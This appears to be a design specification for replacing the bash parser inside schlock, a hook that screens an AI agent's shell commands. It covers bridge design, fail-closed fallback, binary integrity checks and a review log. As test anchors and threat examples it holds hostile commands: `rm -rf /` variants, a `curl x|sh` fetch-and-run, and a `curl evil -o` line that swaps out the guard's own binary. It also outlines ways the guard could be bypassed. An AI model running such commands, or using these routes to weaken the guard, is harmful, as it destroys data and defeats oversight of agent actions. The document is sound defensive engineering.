# LAB-409 Native-Parser Migration — Specification (Stage-1 GATE)

> **Status:** Spec + review only. **No implementation in this ticket (LAB-410).** Stage-2/3 children (§9) are promoted only after this gate. **Cleared one expert-panel review round (high-stakes) — verdict + resolution log in §11.**
>
> **For agentic workers:** the Stage-2/3 tasks in §9 are TDD-shaped and reference `superpowers:executing-plans` / `subagent-driven-development`. Steps use `- [ ]` checkboxes.

**Goal:** Replace bashlex as schlock's *primary* bash AST parser with a native parser that does not raise on common shell idioms (the `$(a && b)` / `[[ ]]` / `a=(1 2 3)` / `$(( ))` over-block class), while keeping schlock 100% install-safe (no compiler, no Python-floor bump, glibc+musl) and — the non-negotiable invariant — **never turning a current BLOCK into an ALLOW**.

**Decision (this gate ratifies):** **mvdan/sh v3, invoked as a `CGO_ENABLED=0` static Go subprocess-CLI**, wrapped by a strangler-fig `NativeBridge` behind the existing `BashCommandParser` interface, with a three-tier fail-closed fallback **native → in-process bashlex → deny**. Loser analysis (tree-sitter) is Appendix A.

**Tech Stack:** Python ≥3.9 (unchanged floor), `mvdan.cc/sh/v3` (Go, BSD-3-Clause), Go toolchain at *build* time only (never at install/runtime), vendored per-platform static binaries.

---

## 1. Grounding — eval claims verified against live code

Re-verified against schlock `@ schlock-v0.7.6` (`a9f5464`). Verified true, plus corrections/additions the evals did not surface (the ➕ rows drove the review hardening):

| Claim | Verified against | Result |
|---|---|---|
| Python floor `>=3.9` | `pyproject.toml:14,20,145`, `.github/workflows/test.yml:17`, **`pyproject.toml:92` ruff `target-version="py39"`** | ✅ true — but **5 sites**, not 4 (5th = ruff). *Moot: mvdan/sh needs no bump.* |
| bashlex unescapes `rm\ -rf\ /`→`rm -rf /`; native parsers don't | `core/parser.py:544-589`; `tests/test_dangerous_commands.py:268` (`should_block=True`) | ✅ true |
| Fail-closed: parse failure → BLOCKED | `core/validator.py:855-871` | ✅ true |
| 64KB DoS guard `MAX_COMMAND_SIZE` | `integrations/commit_filter.py:45,254,291,470,569` | ⚠️ guard is **only** in `commit_filter`, **fail-open**; core path has none |
| #54/#96 AND-OR unfixed | `core/parser.py:21-120` | ⚠️ **stale** — runtime yacc correction shipped; retained for the bashlex fallback tier |
| arg-unescape = one function | consumers at `parser.py:296,373,419,544` | ➕ **broader** — 4 `.word` consumers, whole `.word` semantics |
| — | **`SubstitutionValidator` walks the raw AST independently** (`validator.py:829` → `substitution.py`), kinds `commandsubstitution`/`processsubstitution`/`parameter`/`variable` | ➕ **second walker family** the `AstView` contract must satisfy (§3.2) |
| offset risk = string-literals only | `extract_command_segments` (`parser.py:501`) slices char-indexed `command[start:end]`; `extract_string_literals` (`:668`) indexes `command[start]` | ➕ **3 `.pos` consumers**, byte-vs-char is the *under-block* direction (§4) |
| perf headroom | `test_performance.py:121` (`<0.25ms`), `:137` (`<0.75ms`) | ➕ a 2.28ms subprocess **breaks both** (§9 T7) |
| hot path parses once | `validator.py:802` **and re-parses per-segment at `:913`** | ➕ N-segment pipeline = N+1 parses → derive segments from one AST, don't re-parse (§3.2, §9 T2) |

Node-kind vocabulary the code switches on (12 exact strings, must be reproduced by the adapter — note `pipe` ≠ `pipeline`, `.list` is the substitution node's inner-AST accessor): `command`, `pipeline`, `pipe`, `list`, `compound`, `redirect`, `assignment`, `word`, `operator`, `parameter`, `commandsubstitution`, `processsubstitution`.

Current vendoring: `.claude-plugin/vendor/` = **868 KB, 100% pure-Python**, on `sys.path` via `hooks/pre_tool_use.py:25-31`.

---

## 2. Parser choice — mvdan/sh (decided)

**Chosen: mvdan/sh, subprocess-CLI.** One-line rationale: tree-sitter's only win is speed (37–65×), which optimizes a +2 ms cost nobody feels behind a Bash tool call, while charging the exact distribution tax LAB-402 left unresolved — the **musl-aarch64 core-wheel gap is a hard wall** and the file-copy install forces a `SessionStart` pip shim. mvdan/sh's pure-Go static binary makes glibc-vs-musl a non-issue and needs **zero** install machinery and **no Python-floor bump**. Per LAB-402, the floor bump did not crown tree-sitter; this gate confirms mvdan/sh is the lower-distribution-risk path. Full loser analysis + decision matrix: **Appendix A**.

**Cost accepted:** forfeit "zero binary in repo / 100% pure-Python" (868 KB → ~13 MB committed binaries); +2 ms cold parse (warm cache absorbs repeats); re-implement the `.word` unescape (§4 — identical cost for tree-sitter, not a differentiator).

---

## 3. Bridge design — subprocess-CLI (decided)

subprocess-CLI (`CGO_ENABLED=0` static Go, 2.28 ms/call) over cgo `c-shared`+`ctypes` (0.176 ms/call but reintroduces the per-platform + glibc/musl **ABI matrix** that sank tree-sitter — self-defeating). Decision matrix in Appendix A.

### 3.1 The Go CLI (built artifact)

Vendored source at `tools/schlock-parse/main.go`. Reads bash on **stdin**, writes typed-JSON AST to stdout. No flags, no network, no fs writes.

```go
// mvdan.cc/sh/v3/syntax + syntax/typedjson. Exit 0 = parsed; 2 = parse error
// (msg on stderr); 3 = stdin read error; exit>3 reserved.
src, err := io.ReadAll(os.Stdin)
if err != nil { os.Stderr.WriteString(err.Error()); os.Exit(3) }   // MUST NOT swallow (under-block guard)
f, perr := syntax.NewParser().Parse(bytes.NewReader(src), "")      // comments OFF (no rule inspects them)
if perr != nil { os.Stderr.WriteString(perr.Error()); os.Exit(2) }
typedjson.Encode(os.Stdout, f)
```

**Contract:** exact `mvdan.cc/sh/v3` version + parser options pinned in T1 against the corpus (eval baseline v3.13.1). The bridge asserts the parsed byte-span covers the **full** input length — a short read that parses a prefix (dropping a trailing `; rm -rf /`) must be treated as failure → fallback, never a clean success.

### 3.2 How `core/parser.py` invokes it

New `NativeBridge` (`src/schlock/core/native_bridge.py`) exposes `parse(command) -> AstView`. `AstView` is the strangler-fig seam — a duck-typed node view that must satisfy **both** AST-walker families in the codebase:

1. `BashCommandParser`'s 8 methods (`core/parser.py`) — `.kind`, `.parts`, `.word`, `.pos`, `.heredoc`, `.list`; and
2. `SubstitutionValidator`'s independent walk (`validator.py:829` → `substitution.py`) — `commandsubstitution`/`processsubstitution`/`parameter`/`variable` kinds, `.list` inner-AST.

**Mapping table is a deliverable, not an afterthought (T2):** an explicit `mvdan-node-type → (bashlex kind-string, child-attr)` table covering all 12 kinds in §1. **Any typed-JSON node type or `WordPart` type without an explicit mapping MUST raise** (→ §6 fallback). A tolerant "skip unknown node" is a silent under-block and is forbidden by contract.

The bridge: (1) input size-guard (§5); (2) `subprocess.Popen`, write command to stdin, **bounded incremental stdout read** (§5) — not `subprocess.run(capture_output=True)`, which buffers unboundedly; kill+wait on overflow (no zombies); (3) assert full-input span (§3.1); (4) map typed-JSON → `AstView`; (5) on **any** failure → §6 fallback.

**Parse once.** The bridge parses the whole command a single time; `extract_command_segments` derives segment views by walking the **parent AST's sub-nodes**, replacing the per-segment re-parse at `validator.py:913`. This eliminates the N-extra-spawn amplification at its root (a per-parse memo does not — the segment strings are distinct keys; see §9 T2).

`BashCommandParser.parse()` (`core/parser.py:333`) becomes a one-line delegate to `self._bridge.parse(...)`. **No changes** to `validator.py` / `substitution.py` call sites.

---

## 4. Arg-unescape & offset reconstruction (security-critical)

**The risk.** bashlex auto-unescapes (`part.word` for `rm\ -rf\ /` is already `rm -rf /`) and emits **char** offsets; mvdan/sh keeps escapes structural and emits **byte** offsets. Two distinct under-block vectors:

**(a) `.word` unescape.** Reproduce bashlex `.word` in the adapter by concatenating each `WordPart`'s unescaped value: `Lit` → shell backslash-unescape (`\<space>`→space; covers `:268`); `SglQuoted` → verbatim, quotes stripped; `DblQuoted` → recurse, framing `"` stripped; `ParamExp`/`CmdSubst`/`ProcSubst` → **preserve source text** (`$VAR`, `$(...)`, `<(...)`) so substitution/param checks still fire (over-flattening = under-block). Single chokepoint for all 4 consumers (`parser.py:296,373,419,544`).

**(b) byte→char offsets.** The adapter converts mvdan byte offsets to Python code-point offsets for **all three** `.pos` consumers — `extract_string_literals:668`, `extract_heredoc_ranges:591`, **and `extract_command_segments:501`** (omitting the last was the review's CRIT: a multibyte command mis-slices, `rm -rf /` is mangled, matches no rule → ALLOW). Word spans must be reproduced **quote-inclusive** (bashlex includes framing quotes; the `command[start]=='"'` check at `:672` depends on it). This offset contract is fixed **here**, not deferred.

**Acceptance — superset differential oracle (not equality).** For every safe + adversarial command in the suites, assert the native tier's **danger surface ⊇ bashlex's** across **all detection outputs**: `has_dangerous_constructs`, `extract_commands_with_args`, `extract_command_segments`, `extract_string_literals`, `extract_heredoc_ranges`, `SubstitutionValidator` verdict, and the **full `validate_command` verdict**. Superset, not equality, because bashlex under-decodes (e.g. `$'\x72\x6d'`→`$x72x6d`); if mvdan decodes it correctly to `rm`, native may reveal *more* danger, never less — an equality oracle would wrongly pressure implementers to dumb native down to bashlex's bugs.

**Anchors, tagged by blocking layer:** `:268` `rm\ -rf\ /` → BLOCK via the AST rule ("Complete filesystem destruction") — the true `.word`/segment anchor. `:280` `rm -r$''f /` → blocks via the **optional ShellCheck** integration, **not** the parser; it is NOT a `.word` anchor. Run the native safety suite with **ShellCheck disabled** to isolate the parser, and add a paired **dangerous variant of each of the 7 newly-parseable constructs** (e.g. `$(a || rm -rf /)`, `a=($(curl x|sh))`) that MUST BLOCK — parseability alone is necessary-not-sufficient.

---

## 5. Size guards (both fail-closed → fallback)

1. **Input guard** — before spawn. Relocate `MAX_COMMAND_SIZE = 64*1024` from `commit_filter.py` to a shared `core` constant (update the 4 refs `:254/:291/:470/:569`; **preserve commit_filter's fail-open** local behavior while core is **fail-closed**). Input > 64 KB → skip native → §6 fallback.
2. **Output guard (anti-OOM)** — a bounded incremental stdout read (§3.2), not a post-hoc `len()`. `MAX_AST_JSON_SIZE = 12 * 1024 * 1024` (12 MB) — deliberately **above** the eval's ~8.8 MB legit worst-case output for a 64 KB input, so it trips only on genuine subprocess pathology (a misbehaving/backdoored binary streaming garbage), never on legitimate max-size input. Overflow → kill+wait → §6 fallback. Its job is bounding the hook's memory against a runaway subprocess, not a second input-derived guard.

---

## 6. Fail-closed fallback contract

**Correct invariant (the review corrected the original overclaim):** the fallback chain covers **failures** (exceptions / exit codes / guard trips), **not semantic parity**. A native parse that *succeeds* but produces a weaker `AstView` raises nothing and would under-block. Two defenses close that gap: (a) the §3.2 contract that any unmapped node/part **raises** (converting a silent-skip into a failure the fallback catches); (b) the §4 superset oracle as the **release gate**, plus a rollout period running bashlex in parallel and logging/blocking on native-vs-bashlex danger-surface disagreement (§8).

Tier order is fixed: **native → in-process bashlex → deny.** Every bridge exit returns a valid mapped AST or raises `ParseError` (→ `validator.py:855` → BLOCKED).

| Failure mode | Detection | Action |
|---|---|---|
| Binary missing / unsupported GOOS-GOARCH / not executable | spawn error / path probe | → bashlex; `warning` once |
| **Runtime hash ≠ MANIFEST** (§7) | pre-exec SHA-256 check | → bashlex; `warning` (tamper signal) |
| Exec crash / signal / exit > 3 | returncode | → bashlex |
| stdin read error (exit 3) / span < input length | returncode / span check | → bashlex |
| Native parse error (exit 2) | returncode == 2 | → bashlex |
| Timeout (`T = 250 ms`, ~100× typical) | `TimeoutExpired` | kill+wait → bashlex |
| Input > 64 KB / output > 12 MB | §5 guards | → bashlex |
| JSON malformed / **unmapped node or WordPart** | decode error / adapter raise | → bashlex |
| **bashlex fallback also raises** | `bashlex.errors.ParsingError` | **raise `ParseError` → BLOCKED** (unchanged production behavior) |

bashlex stays vendored as the net (over-blocks the 7 constructs, never under-blocks); the `_apply_andor_substitution_correction()` patch (`parser.py:21-120`) is retained for that tier.

**`SCHLOCK_PARSER` switch** (`auto` default): forces a tier. Load-bearing for two reasons only — CI tier isolation (proving both tiers green needs forcing bashlex when the binary is present) and a kill-switch for a silent-correctness native bug (which auto-fallback cannot catch). **Security scoping (mirrors the existing project-whitelist ban):** honored **only** from user/global config scope, **never** project `.claude/settings.json` (a hostile repo pinning the tier = privilege escalation); value allowlisted to `{auto,native,bashlex}`, any other value → safest tier (`auto`); `native` here means **native-only, parse-error→deny, no bashlex rescue** (so CI isolates the native path and a native under-block can't pass green on a bashlex save); `native` never disables the terminal `→ deny`.

---

## 7. Distribution / CI plan

**Vendoring:** `.claude-plugin/bin/<goos>-<goarch>/schlock-parse[.exe]`, committed (install is file-copy; no build at the user's machine — non-negotiable).

**Platform matrix (pure-Go GOOS/GOARCH; glibc/musl collapse into one binary each) — 5 targets:**

| Target | Covers |
|---|---|
| linux/amd64 | Linux x86-64, glibc **and** musl (Alpine, distroless) |
| linux/arm64 | Linux ARM64, glibc **and** musl — *the cell tree-sitter could not fill* |
| darwin/amd64 | macOS Intel |
| darwin/arm64 | macOS Apple Silicon |
| windows/amd64 | Windows x64 |

~5 × ~2.4 MB ≈ **~12 MB** committed. `windows/arm64` **cut** (no known user; §6 routes unsupported platforms to bashlex safely, so the cut cannot under-block — it only removes untested-binary supply-chain surface).

**Binary integrity (security-critical — a swapped parser is a global under-block):**
- Add `.claude-plugin/bin/` **and** `.claude-plugin/vendor/` to self-protection: `SELF_PROTECTION_PATHS` + the `self_protect.py` Write/Edit matcher + a Bash rule blocking writes to them (today `self_protect.py:30` + `14_self_protection.yaml` cover only the two config YAMLs — nothing stops `curl evil -o .claude-plugin/bin/.../schlock-parse`).
- **Runtime SHA-256 vs `MANIFEST.json` before every exec** (mismatch → bashlex, §6). Hash-vs-manifest alone catches staleness, not a malicious commit updating both — so also:
- CI job that **rebuilds from pinned source + Go and asserts byte-equality** with the committed binary (`GOFLAGS=-trimpath CGO_ENABLED=0 -ldflags="-s -w"`, single ubuntu runner cross-compiles all 5 targets).

**Build workflow** (`.github/workflows/build-parser.yml`, tag/manual — not per-PR): matrix build + record version & per-binary SHA-256 in `MANIFEST.json`.

**Per-PR CI** (`.github/workflows/test.yml`) — **floor unchanged** `['3.9','3.14']` (the mvdan/sh dividend; the §1 5-site 3.10 bump is **not** performed). Add jobs: `SCHLOCK_PARSER=native` (native-only) on linux/amd64; `SCHLOCK_PARSER=bashlex` (fallback tier); and a **REQUIRED** musl job — the musl/aarch64 gap is the entire reason mvdan/sh won, so its verification cannot be optional. Note an Alpine **amd64** container proves musl but not the **aarch64+musl** cell; cover aarch64+musl by-construction (pure-Go static, no libc) and add a qemu smoke test if feasible.

**Supply chain:** mvdan/sh BSD-3-Clause (WTFPL-compatible) → `THIRD_PARTY_LICENSES`; note it's a build-time-only dep for `osv-scanner` (`test.yml:75`).

---

## 8. Rollback & monitoring

- **Kill-switch:** `SCHLOCK_PARSER=bashlex` (user/global) reverts instantly, no redeploy.
- **Rollback:** revert the vendored-binary + wiring commits; bashlex path untouched → clean git revert, zero data/behavior migration.
- **Monitoring:** audit log (`~/.config/schlock/audit.jsonl`) gains a `parser_tier` field (`native`/`bashlex-fallback`/`deny`) **and a native-vs-bashlex danger-surface disagreement counter** (tier counts alone can't see a silent semantic regression — the disagreement counter can). Fallback rate >~1% signals a distribution problem; any disagreement in rollout is a release-blocking bug.

---

## 9. Stage-2/3 build children (promotable)

Promote as sub-issues of **LAB-409** after this gate. Stage-2 = foundational build (parallel); Stage-3 = integrate + verify.

| # | Title | Size | Stage | Blocked by |
|---|---|---|---|---|
| T1 | Build & vendor `schlock-parse` Go CLI + `MANIFEST.json` (stdin-err→exit 3, comments-off, reproducible `-trimpath`) | s | 2 | — |
| T2 | `NativeBridge` + `AstView`: mvdan→bashlex **kind-mapping table** (both walker families, 12 kinds; unmapped→raise); **parse-once, derive segments** from parent AST; `Popen`+bounded read | l | 2 | T1 |
| T3 | Arg-unescape `.word` + **byte→char offsets for all 3 `.pos` consumers** + **superset differential oracle** (all detection outputs + full verdict + dangerous variants, ShellCheck-disabled) | l | 2 | T2, T5 |
| T4 | Size guards — input 64 KB (relocate `MAX_COMMAND_SIZE`, keep commit_filter fail-open) + output 12 MB anti-OOM bounded read | s | 2 | T2 |
| T5 | Fail-closed state machine + `SCHLOCK_PARSER` (user/global-scope-only, allowlisted, `native`=native-only) | m | 2 | T2, T4 |
| T6 | Binary integrity: `bin/`+`vendor/` in self-protection paths + rules; runtime SHA-256 vs MANIFEST → mismatch fallback | m | 2 | T1 |
| T7 | Re-baseline `test_performance.py:121,137`; assert parse-once (no per-segment spawn) | s | 3 | T2 |
| T8 | Wire `native_bridge` into `BashCommandParser.parse`; full suite green on both tiers | m | 3 | T2–T6 |
| T9 | CI: `build-parser.yml` + native-only/bashlex jobs + **required** musl(aarch64) + rebuild-byte-equality | m | 3 | T1, T8 |
| T10 | `audit.jsonl` `parser_tier` + native-vs-bashlex disagreement counter + docs (README/CONFIGURATION/ROADMAP) | s | 3 | T8 |

### Per-child acceptance (load-bearing)

**T2 — bridge + mapping.** Acceptance: (1) 24-construct corpus parses; the 7 bashlex-failing constructs parse instead of raising; (2) an explicit mvdan→`(kind, child-attr)` table exists and an **unmapped node type raises** (tested); (3) **walker OUTPUT parity** — `extract_command_segments`, `has_dangerous_constructs`, `extract_commands_with_args`, and `SubstitutionValidator` produce equal-or-superset results vs bashlex over the corpus (parseability alone is insufficient); (4) segments derived from one parse, asserted by spawn-count == 1 per command.

- [ ] Failing test: `AstView` for `echo $(a && b)` exposes inner `list` + `&&` operator; `$(a || rm -rf /)` → `SubstitutionValidator` flags inner `rm -rf /`.
- [ ] Run → FAIL. Implement typed-JSON→`AstView` + mapping table. Run → PASS. Commit.

**T3 — unescape + offsets + oracle (security-critical).** Acceptance: full safety suite green under `SCHLOCK_PARSER=native` with **ShellCheck disabled**; `:268` (`rm\ -rf\ /`) BLOCKS; every dangerous-variant of the 7 constructs BLOCKS; superset oracle passes on all detection outputs incl. multibyte anchors from `test_unicode_obfuscation.py`.

- [ ] Failing test: superset oracle over `test_string_literal_bypass.py` + `test_unicode_obfuscation.py` + `test_dangerous_commands.py` + a multibyte segment.
- [ ] Run → FAIL. Implement per-`WordPart` unescape + byte→char translation (quote-inclusive spans). Run full safety suite both tiers → PASS. Commit.

**T7 — perf re-baseline.** `test_performance.py:121` (`<0.25ms`)/`:137` (`<0.75ms`) fail on a 2.28 ms subprocess. Split into tier-aware gates (native cold ~3 ms; warm/cached stays `<0.01ms` per `:188`; bashlex tier keeps sub-ms). Assert one spawn per command (parse-once). Document *why* the number moved.

---

## 10. Open questions for review

1. **Vendored binaries in git** — ~12 MB committed in a WTFPL plugin, vs git-lfs / `SessionStart` release-asset fetch (fetch reintroduces a network dependency + failure surface). Leaning: commit them; runtime hash (§7) covers integrity.
2. **Windows bash semantics** — Git-Bash/WSL: does mvdan/sh's bash mode match what Claude Code executes on Windows? Windows corpus check in T2.

*(Byte-offset reconciliation — formerly open — is now a fixed contract in §4, not a deferred question.)*

---

## 11. Review

**Verdict: FIX-FIRST → resolved.** Expert-panel-review (high-stakes: security-critical parser; foundational infra; gate others build from) ran all four specialists in parallel against the spec grounded on `schlock-v0.7.6`. The architecture was affirmed by all four (strangler-fig containment, three-tier fail-closed default, stdin-not-argv subprocess, mvdan/sh choice — "appropriately lean, not gold-plated"). The panel found real **contract** gaps (not architectural errors), all of which are resolved in this revision:

| # | Panel finding (converged agents) | Resolution |
|---|---|---|
| 1 | **CRIT** — "silent-allow impossible by construction" false: fallback fires on exceptions, not semantic parity; a weaker-but-valid `AstView` under-blocks | §6 invariant corrected; §3.2 unmapped-node-**raises**; §4 superset oracle = release gate; §8 disagreement counter |
| 2 | **CRIT** — `AstView` undercounts consumers: `SubstitutionValidator` is a 2nd independent walker (`validator.py:829`) | §3.2 contract now spans **both** walker families + a 12-kind mapping table (§1); T2 gates on danger-detection parity |
| 3 | **CRIT** — byte-vs-char offset bug omits `extract_command_segments` (dangerous direction → ALLOW) | §4(b) covers **all 3** `.pos` consumers; multibyte anchor in T3 |
| 4 | **CRIT** — no self-protection on `bin/`; a Write/`curl -o` swaps the parser → global under-block; MANIFEST is build-time only | §7 adds `bin/`+`vendor/` to self-protection + **runtime SHA-256** + CI rebuild byte-equality |
| 5 | **MAJ** — oracle only compares `reconstruct_command` (discards structure); equality pins native to bashlex's decode bugs | §4 → **superset** oracle over all detection outputs + full verdict + dangerous variants |
| 6 | **MAJ** — `subprocess.run(capture_output)` buffers before the size check → memory-DoS guard defeated | §3.2/§5 → `Popen` + bounded incremental read; kill+wait (no zombies) |
| 7 | **MAJ** — §5 guards inconsistent: 64 KB input → 8.8 MB output > 8 MB guard → native never serves the fancy band | §5 `MAX_AST_JSON_SIZE` raised to 12 MB (above legit worst case) |
| 8 | **MAJ** (all 4) — T3 parse-memo is dead weight: distinct segment strings = 0 hits; real cost is spawn | T3 **cut**; §3.2 parse-once/derive-segments eliminates the N spawns |
| 9 | **MAJ** — `SCHLOCK_PARSER` project-scope = privilege escalation; unknown-value undefined; native rescued by bashlex hides CI regressions | §6 → user/global-scope-only, allowlisted, `native`=native-only |
| 10 | **MAJ** — main.go swallows stdin read error → prefix parse → under-block | §3.1 → `exit 3` on read error + full-span assertion |
| 11 | **MAJ** — `:280` misattributed as a `.word` anchor (blocks via ShellCheck) | §4 anchors tagged by layer; native suite runs ShellCheck-disabled |

**Cut list applied:** T3 parse-memo (refuted by all four); `windows/arm64` target (no user; unsupported→bashlex safe); tree-sitter loser analysis → Appendix A; `KeepComments`/`main.go` illustrative flags → comments-off. **Catchphrase vetoes validated:** T3-cut and windows/arm64-cut are code-verified and cannot under-block (accepted); the craftsman's *full* cut of the §5 output guard was **overruled** under high-stakes (a runaway/backdoored subprocess would OOM the hook) — kept as a recalibrated bounded read. **Anti-cuts defended:** `AstView` (7+ consumers, real adapter), MANIFEST+reproducible build, input guard, three-tier fallback, arg-unescape, superset oracle, `parser_tier` audit, musl job (strengthened to required).

This gate is **cleared** (one round). The Stage-2/3 children in §9 are promotable.

---

## Appendix A — Loser analysis (tree-sitter; cgo bridge)

**Parser matrix:**

| Axis | mvdan/sh (subprocess) | tree-sitter-bash |
|---|---|---|
| Corpus correctness | 24/24 | 24/24 |
| Parse latency | 2.28 ms (+2 ms) | 0.004–0.007 ms (37–65×) |
| Python floor | no bump (3.9) | **3.10 bump, 5 sites** (§1) |
| glibc+musl | one static binary | **no musllinux-aarch64 core wheel** (hard gap) |
| Install machinery | none (vendored binary) | `SessionStart` pip-into-`CLAUDE_PLUGIN_DATA` shim; cp313 non-abi3 version-locked core wheel |
| Build toolchain | Go, cross-compile all from one host, no C | C compiler per target |

**Bridge matrix:**

| Option | Latency | Distribution | Verdict |
|---|---|---|---|
| subprocess-CLI (`CGO_ENABLED=0`) | 2.28 ms | pure-Go static; glibc+musl; one host builds all | **chosen** |
| cgo `c-shared` + `ctypes` | 0.176 ms | reintroduces per-platform + glibc/musl **ABI matrix** | rejected (self-defeating) |
